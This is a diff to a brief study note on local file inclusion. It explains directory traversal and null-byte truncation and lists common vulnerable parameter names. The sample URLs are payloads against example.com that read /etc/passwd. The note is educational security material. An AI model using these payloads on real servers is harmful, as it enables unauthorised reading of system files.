@@ -3,24 +3,24 @@
 
 web application vulnerability that allows an attacker to access files stored on the server
 
-* example - 'http://example.com/index.php?page=etc/password'
+* example - example.com/index.php?page=etc/password
 
 * You can move up directories with ../../../../
-* So our example would chnage too - example - http://example.com/index.php?page=./../../../etc/password
+* So our example would change too - example - example.com/index.php?page=./../../../etc/password
 
 * .. = parent directory
 * / = directory separator
 
 * %00 = is a null byte, a special character that tells a computer, Stop reading here.
-* http://example.com/index.php?page=./../../../etc/password%00
+* example.com/index.php?page=./../../../etc/password%00
 
 * F-P-I-T-V-L
-  * file - http://example.com/index.php?file=../../../../etc/passwd
-  * page - http://example.com/index.php?page=../../../../etc/passwd
-  * include - http://example.com/index.php?include=../../../../etc/passwd
-  * template - http://example.com/index.php?template=../../../../etc/passwd
-  * view - http://example.com/index.php?view=../../../../etc/passwd
-  * lang - http://example.com/index.php?lang=../../../../etc/passwd
+  * file - xample.com/index.php?file=../../../../etc/passwd
+  * page - example.com/index.php?page=../../../../etc/passwd
+  * include - example.com/index.php?include=../../../../etc/passwd
+  * template - example.com/index.php?template=../../../../etc/passwd
+  * view - example.com/index.php?view=../../../../etc/passwd
+  * lang - example.com/index.php?lang=../../../../etc/passwd
 
 
 Side Note:
